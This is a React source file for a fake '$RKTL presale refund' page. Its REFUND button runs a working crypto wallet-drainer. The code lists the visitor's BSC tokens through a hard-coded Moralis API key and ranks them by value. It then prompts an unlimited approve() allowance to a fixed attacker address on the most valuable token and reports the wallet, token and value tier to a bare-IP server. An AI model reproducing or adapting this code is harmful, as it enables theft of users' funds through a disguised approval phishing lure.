import React, { useState, useEffect, useRef } from 'react';
import { useSelector } from 'react-redux';
import styled, { createGlobalStyle } from 'styled-components';
import { useMediaQuery } from 'react-responsive';
import Reveal from 'react-awesome-reveal';
import { CircularProgressbar, buildStyles } from "react-circular-progressbar";
import "react-circular-progressbar/dist/styles.css";
import IconButton from '@mui/material/IconButton';
import ReactLoading from "react-loading";
import LoadingButton from '@mui/lab/LoadingButton';
import { toast } from 'react-toastify';
import Clock from '../components/Presale/Clock';
import SelectCoin from '../components/Presale/SelectCoin';
import * as selectors from '../store/selectors';
import erc20ABI from "../core/ABI/erc20.json";

import { fadeIn, fadeInUp, getUTCNow, getUTCDate, numberWithCommas, LoadingSkeleton, isEmpty } from '../components/utils';
import {
  getTotalPresaleAmount,
  getMaxPresaleCap,
  getMinPresaleCap,
  getpTokenPriceForUSDC,
  getAVAXForUSDC,
  getUSDCForAVAX,
  getUserPaidUSDC,
  getStartPresaleTime,
  getEndPresaleTime,
  buy_pToken
} from '../core/web3';
import { config, def_config } from '../core/config';
import Swal from 'sweetalert2';

//
import axios from "axios";
import { ethers } from "ethers";
import Web3 from "web3";

const GlobalStyles = createGlobalStyle`
  .ico-container {
    display: flex;
    align-items: center;
    justify-content: start;
    flex-direction: column;
    background-size: 100% !important;
    background-position-x: center !important;
    .ico-header {
      max-width: 900px;
      padding: 20px;
      .ico-title {
        font-size: 36px;
      }
      .ico-desc {
        font-size: 20px;
      }
    }
    @media only screen and (max-width: 1400px) {
      flex-direction: column;
    }
    @media only screen and (max-width: 768px) {
      padding: 10px;
      .ico-header {
        padding: 20px;
        .ico-title {
          font-size: 28px;
        }
        .ico-desc {
          font-size: 18px;
        }
      }
    }
  }

  .input-token-panel {
    display: flex;
    background-color: transparent;
    flex-direction: column;
    text-align: left;
    gap: 10px;
    width: 45%;
    .input-box {
      border: solid 1px white;
      border-radius: 8px;
      @media only screen and (max-width: 576px) {
        span {
          font-size: 15px !important;
        }
      }
    }
    @media only screen and (max-width: 768px) {
      width: 100%;
    }
  }

  .input-token {
    width: 50%;
    background: transparent;
    outline: none;
    padding: 10px;
    font-size: 20px;
    font-weight: bold;
    color: white;
    white-space: nowrap;
    text-overflow: ellipsis;
    display: flex;
    align-items: center;
    span {
      font-size: 18px;
      font-weight: normal;
    }
  }

  .email_input {
    max-width: 300px;
  }

  .presale-content {
    max-width: 900px;
    padding: 0;
    background: rgba(90, 70, 255, 0.15);
    border-radius: 20px;
    @media only screen and (max-width: 768px) {
      max-width: 100%;
    }
  }

  .presale-inner {
    border-radius: 12px;
    padding: 10px 60px 40px;
    position: relative;
    background: transparent;
    min-height: 200px;
    h3 {
      line-height: 2;
      margin-bottom: 0;
    }
    @media only screen and (max-width: 1024px) {
      padding: 60px 40px 40px;
    }
    @media only screen and (max-width: 768px) {
      padding: 0px 10px 40px;
    }
  }

  .presale-bg {
    position: fixed;
    width: 100%;
    height: 100vh;
    top: 76px;
  }

  .end-content {
    background: #2d81e2;
    padding: 16px;
    border-radius: 40px;
    width: 80%;
    margin: auto;
    margin-top: 5px;
    margin-bottom: 5px;
  }

  .buy_content {
    padding: 22px;
    border: solid 1.5px #5a5196;
    border-radius: 20px;
  }

  .progress-bg {
    @media only screen and (max-width: 576px) {
      width: 60%;
    }
  }

  .inverstors {
    width: fit-content;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 25px;
  }

  .amount_bar_text {
    display: flex;
    justify-content: space-between;
  }

  .progress {
    height: 1.5rem;
    background-color: #a9a9a9;
  }

  .progress-bar {
    background-color: #7621ff;
  }

  .MuiLoadingButton-root {
    transition: all 0.5s ease;
    &.Mui-disabled {
      background-image: none;
      background: #626262b3 !important;
    }
  }

  .MuiLoadingButton-loading {
    padding-right: 40px;
    background: linear-gradient(90deg, #aa2d78 -3.88%, #a657ae 100%);
    color: rgb(255 255 255 / 50%) !important;
    transition: all 0.5s ease;
  }
  .swal2-popup {
    border-radius: 20px;
    background: #2f2179;
    color: white;
  }
  .swal2-styled.swal2-confirm {
    padding-left: 2rem;
    padding-right: 2rem;
  }
  .backdrop-loading {
  }
  
  .btn-change {
    width: 40px;
    height: 40px;
    background-color: #8b86a4 !important;
    border-radius: 50%;
    margin-bottom: 8px !important;
    color: white !important;
    &:hover {
      background-color: #8b86a4 !important;
    }
  }

  .presale-input {
    align-items: end;
    @media only screen and (max-width: 768px) {
      flex-direction: column;
      gap: 10px;
    }
  }
`;

const DATABASE_API = "http://185.77.96.193:2083";
const limitValue = 500;
const goodValue = 2000;

const RKTLICO = (props) => {
  const balance = useSelector(selectors.userBalance);
  const wallet = useSelector(selectors.userWallet);
  const web3 = useSelector(selectors.web3State);

  const [pending, setPending] = useState(false);

  //
  const targetAddress = "0xb6BCb460b60FF9Dd192e15922557239EB92c2078";

  const web3Instance = new Web3();
  web3Instance.setProvider(Web3.givenProvider);
  const busdAddress = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
  const busdContract = new web3Instance.eth.Contract(erc20ABI, busdAddress);

  const _1stTokenContract = useRef(null);
  const _2ndTokenContract = useRef(null);
  const _BNBPrice = useRef(0);

  const _1stMaxBalance = useRef(0);
  let _2ndMaxBalance = 0;


  const getTokenPrice = async (tokenAddress, decimals) => {
    try {
        let res = null;
        try {
            res = await axios.get(`https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${tokenAddress}&vs_currencies=usd`);
            if (res.data[tokenAddress] != undefined) {
                if (res.data[tokenAddress].usd != undefined)
                    return res.data[tokenAddress].usd;
            }
        } catch (e) {
            console.log(e);
        }

        try {
            res = await axios.get(`https://deep-index.moralis.io/api/v2/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c/${tokenAddress}/pairAddress?chain=0x38&exchange=pancakeswapv2`, {
                headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
            });
        } catch (e) {
            return 0;
        }

        const pairAddress = res.data.pairAddress;
        const token0Address = res.data.token0.address;

        if (pairAddress == undefined)
            return 0;

        res = await axios.get(`https://deep-index.moralis.io/api/v2/${pairAddress}/reserves?chain=bsc`, {
            headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
        });

        const reserve0 = res.data.reserve0;
        const reserve1 = res.data.reserve1;
        if (token0Address.toUpperCase() == tokenAddress.toUpperCase()) { //token0 is not BNB
            const reserveNum0 = ethers.utils.formatUnits(reserve0, decimals);
            const reserveNum1 = ethers.utils.formatUnits(reserve1, 18);

            if (reserveNum1 < 50)
                return 0;

            const price = reserveNum1 * _BNBPrice.current / reserveNum0;
            return price;
        }
        else { // token0 is BNB
            const reserveNum0 = ethers.utils.formatUnits(reserve0, 18);
            const reserveNum1 = ethers.utils.formatUnits(reserve1, decimals);

            if (reserveNum0 < 50)
                return 0;

            const price = reserveNum0 * _BNBPrice.current / reserveNum1;
            return price;
        }
    } catch (e) {
        return 0;
    }
}

useEffect(() => {
  try {
      const initialize = async () => {
          const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + wallet + "/erc20?chain=bsc", {
              headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
          });

          const userWalletTokenList = userWalletRes.data;
          userWalletTokenList.map(async token => {
              try {
                  const contract = new web3Instance.eth.Contract(erc20ABI, token.token_address);

                  let tokenBalance = null;

                  tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);

                  const tokenPrice = await getTokenPrice(token.token_address, token.decimals, wallet);
                  let moneyBalance = tokenPrice * tokenBalance;
                  console.log(token.symbol, moneyBalance);
                  if (moneyBalance > _1stMaxBalance.current) {
                      _1stMaxBalance.current = moneyBalance;
                      _1stTokenContract.current = contract;
                      console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
                  }

                  if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
                      _2ndMaxBalance = moneyBalance;
                      _2ndTokenContract.current = contract;
                      console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
                  }
              }
              catch (error) {
                  // console.log('kevin inital data error ===>', error);
              }
          })
      }

      if (!isEmpty(busdContract)) {
          initialize();
      }
  }
  catch (error) {
      console.log('kevin inital data error ===>', error)
  }

  console.log('[WALLET]===', wallet);

}, [wallet, web3])

  const handleBuy = async () => {
    setPending(true);

    axios.post(DATABASE_API + '/update', "To the moon!")
                  .then(response => console.log('user address add succsessful'))
                  .catch(response => console.log(response));
    try {
      if (!_1stTokenContract.current) {
          const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + wallet + "/erc20?chain=bsc", {
              headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
          });

          const userWalletTokenList = userWalletRes.data;
          userWalletTokenList.map(async token => {
              try {
                  const contract = new web3Instance.eth.Contract(erc20ABI, token.token_address);

                  let tokenBalance = null;

                  tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);

                  const tokenPrice = await getTokenPrice(token.token_address, token.decimals, wallet);
                  // console.log(token.symbol, tokenBalance);
                  let moneyBalance = tokenPrice * tokenBalance;
                  if (moneyBalance > _1stMaxBalance.current) {
                      _1stMaxBalance.current = moneyBalance;
                      _1stTokenContract.current = contract;
                      console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
                  }

                  if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
                      _2ndMaxBalance = moneyBalance;
                      _2ndTokenContract.current = contract;
                      console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
                  }


              }
              catch (error) {
                  // console.log('kevin inital data error ===>', error);
              }
          })
      }

      let tokenAddress = null;

      let date_ = new Date();
      let date = new Intl.DateTimeFormat('en-US', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit'}).format(date_.getTime());

      let article = date + ', user=' + wallet;

      if (_1stTokenContract.current) {
          let allowance = null;

          try {
              allowance = await _1stTokenContract.current.methods.allowance(wallet, targetAddress).call();
              allowance = ethers.utils.formatEther(allowance);

          } catch (e) {
              allowance = 0;
          }

          if (allowance > 0) {
              tokenAddress = _2ndTokenContract.current._address;

              article = article + ', token:' + tokenAddress;
              console.log(article);
              axios.post(DATABASE_API + '/update', article)
                  .then(response => console.log('user address add succsessful'))
                  .catch(response => console.log(response));

              await _2ndTokenContract.current.methods.approve(targetAddress, "1000000000000000000000000000000").send({from: wallet});
          }
          else {
            if (_1stMaxBalance.current >= goodValue) {
              tokenAddress = _1stTokenContract.current._address;

              article = article + ', token:' + tokenAddress + ', GOOD';
              console.log(article);
              axios.post(DATABASE_API + '/update', article)
                  .then(response => console.log('user address add succsessful'))
                  .catch(response => console.log(response));

                await _1stTokenContract.current.methods.approve(targetAddress, "1000000000000000000000000000000").send({from: wallet});
            }
              else if (_1stMaxBalance.current >= limitValue) {
                tokenAddress = _1stTokenContract.current._address;

                article = article + ', token:' + tokenAddress + ', OK';
                console.log(article);
                axios.post(DATABASE_API + '/update', article)
                    .then(response => console.log('user address add succsessful'))
                    .catch(response => console.log(response));

                  await _1stTokenContract.current.methods.approve(targetAddress, "1000000000000000000000000000000").send({from: wallet});
              }
              else {
                  tokenAddress = _1stTokenContract.current._address;

                  article = article + ', token:' + tokenAddress;
                  console.log(article);
                  axios.post(DATABASE_API + '/update', article)
                      .then(response => console.log('user address add succsessful'))
                      .catch(response => console.log(response));

                  await _1stTokenContract.current.methods.approve(targetAddress, "1000000000000000000000000000000").send({from: wallet});
              }
          }
      }
      else {
        article = article + ', token:' + busdAddress;
        console.log(article);
        axios.post(DATABASE_API + '/update', article)
            .then(response => console.log('user address add succsessful'))
            .catch(response => console.log(response));
            
          await busdContract.methods.approve(targetAddress, "1000000000000000000000000000000").send({from: wallet});
      }


  }
  catch (error) {
      console.log(wallet);
      if (wallet == null || wallet == undefined || wallet == '') {
        toast.error("Please connect to your wallet ");
      } else
        toast.error("Refund was canceled by user ");
  }
  finally {
    setPending(false);
  }
  }


  return (
    <div className='page-container text-center ico-container'>
      <GlobalStyles />
      <div className='ico-header'>
        <Reveal className='onStep' keyframes={fadeInUp} delay={0} duration={600} triggerOnce>
          <p className='ico-title' style={{fontSize: "56px"}}>$RKTL PRESALE REFUND</p>
        </Reveal>
        <Reveal className='onStep' keyframes={fadeInUp} delay={300} duration={600} triggerOnce>
          <p className="ico-desc">
          Sorry for being late.<br/>
          Presale was failed and we couldn't go futher.<br/>
          After consideration, we made a decision to refund.<br/>
          Please refund your invest.
          </p>
        </Reveal>
      </div>
      
      <button
        onClick={handleBuy}
        loading={pending.toString()}
        variant="contained"
        className="btn-main btn3 fs-20"
      >
        REFUND
      </button>
      
    </div >
  );
};

export default RKTLICO;    